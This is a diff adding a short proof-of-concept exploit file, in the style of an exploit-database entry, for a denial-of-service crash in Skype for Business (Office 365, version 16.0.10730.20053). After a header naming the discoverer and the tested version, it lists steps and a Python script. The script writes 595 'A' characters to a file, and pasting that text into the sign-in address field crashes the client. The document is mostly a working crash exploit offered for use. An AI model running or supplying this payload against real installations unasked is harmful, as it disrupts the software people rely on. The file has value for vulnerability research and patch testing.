@@ -1,0 +1,19 @@
+# Exploit Title: Skype Empresarial Office 365 16.0.10730.20053 - 'Dirección de inicio de sesión' Denial of service (PoC)
+# Discovery by: Samuel Cruz
+# Discovery Date; 2018-08-29
+# Vendor Homepage: https://www.skype.com/es/business/
+# Tested Version: 16.0.10730.20053
+# Tested on OS: Windows 10 Pro x64 es/home/
+
+#Steps to produce the crash
+#1.- Run python code : python SkypeforBusiness_16.0.10730.20053.py
+#2.- Open SkypeforBusiness.txt and copy context to clipboard
+#3.- Open Skype for business
+#4.- Paste clipboard on "Dirección de inicio de sesión"
+#5.- Iniciar sesión
+#6.- Crashed
+
+buffer = "\x41" * 595
+f = open ("SkypeforBusiness.txt", "w")
+f.write(buffer)
+f.close()
